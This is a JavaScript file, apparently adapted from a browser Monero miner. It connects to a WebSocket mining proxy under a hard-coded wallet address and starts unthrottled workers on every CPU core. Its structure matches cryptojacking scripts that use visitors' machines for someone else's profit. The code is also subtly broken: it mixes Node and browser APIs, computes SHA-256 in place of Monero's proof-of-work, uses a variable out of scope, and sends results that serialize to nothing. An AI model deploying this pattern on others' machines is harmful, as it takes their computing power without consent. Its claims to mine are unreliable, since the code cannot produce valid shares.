const os = require('os'); // Importa el módulo 'os'

// Optimized mining script based on original Monero miner
let server = "wss://ny1.xmrminingproxy.com";
let pool = "moneroocean.stream";
let walletAddress = "45EziBvf7gEAkCE2C39FWNXprx7FbnkbGEi3eGGdpQbzKdVUGjLcDPLK4V9ZvMxFkWKpfpPD2e3srVg6WhuzvYnXFvNhhPJ";
let workerId = "PRUEBA";
let threads = os.cpus().length || -1; // Use all cores by default
let throttleMiner = 0; // Throttle value in percentage (0 = max utilization)
let workers = [], ws, totalHashes = 0, connected = false, job = null, reconnectAttempts = 0;
const maxReconnectAttempts = 10;

const wasmSupported = (() => {
  try {
    if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
      const module = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
      return module instanceof WebAssembly.Module;
    }
  } catch {
    return false;
  }
  return false;
})();

function connectToPool() {
  if (connected || reconnectAttempts >= maxReconnectAttempts) {
    if (reconnectAttempts >= maxReconnectAttempts) {
      console.error("Max reconnection attempts reached. Stopping reconnection.");
    }
    return;
  }
  ws = new WebSocket(server);
  ws.onopen = () => {
    connected = true;
    reconnectAttempts = 0; // Reset reconnect attempts on successful connection
    ws.send(JSON.stringify({
      identifier: "handshake",
      pool,
      login: walletAddress,
      password: "", // Optional
      workerId,
      version: 7
    }));
    console.log("Connected to pool");
  };

  ws.onmessage = (message) => {
    try {
      const data = JSON.parse(message.data);
      if (data.identifier === "job") {
        console.log("New mining job received:", data);
        job = data;
        assignWorkToWorkers();
      } else {
        console.warn("Unhandled message type:", data);
      }
    } catch (error) {
      console.error("Error parsing message:", error);
    }
  };

  ws.onclose = () => {
    connected = false;
    reconnectAttempts++;
    const delay = Math.min(1000 * reconnectAttempts, 30000); // Exponential backoff, max 30s
    console.log(`Disconnected from pool. Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts}/${maxReconnectAttempts})...`);
    setTimeout(connectToPool, delay);
  };

  ws.onerror = (err) => {
    console.error("WebSocket error:", err);
    ws.close();
  };
}

function createWorker() {
  const worker = new Worker(URL.createObjectURL(new Blob([`(${workerScript.toString()})();`], { type: "application/javascript" })));
  worker.onmessage = (e) => {
    if (connected && ws && job) {
      try {
        ws.send(JSON.stringify({
          type: "submit",
          result: e.data.hash,
          job_id: job.job_id
        }));
        totalHashes++;
      } catch (error) {
        console.error("Error sending hash:", error);
      }
    }
  };
  workers.push(worker);
}

function assignWorkToWorkers() {
  if (!job) return;
  console.log(`Assigning job to workers: job_id=${job.job_id}, target=${job.target}`);
  workers.forEach(worker => worker.postMessage(job));
}

function startMining(customPool, customWallet, customWorkerId, customThreads, customThrottle) {
  if (!wasmSupported) {
    console.error("WebAssembly not supported. Mining cannot proceed.");
    return;
  }
  // Apply custom parameters if provided
  if (customPool) pool = customPool;
  if (customWallet) walletAddress = customWallet;
  if (customWorkerId) workerId = customWorkerId;
  if (customThreads >= 0) threads = customThreads;
  if (customThrottle >= 0) throttleMiner = customThrottle;

  while (workers.length < threads || (threads < 0 && workers.length < os.cpus().length)) {
    createWorker();
  }
  connectToPool();
  console.log(`Started mining with ${workers.length} workers and throttle set to ${throttleMiner}%.`);
}

function workerScript() {
  onmessage = function (job) {
    const { job_id, data } = job.data;
    const throttleDelay = Math.max(0, (throttleMiner / 100) * 100); // Calculate delay based on throttle
    setTimeout(() => {
      crypto.subtle.digest("SHA-256", new TextEncoder().encode(data)).then(buffer => {
        postMessage({ hash: buffer, job_id });
      });
    }, throttleDelay);
  };
}
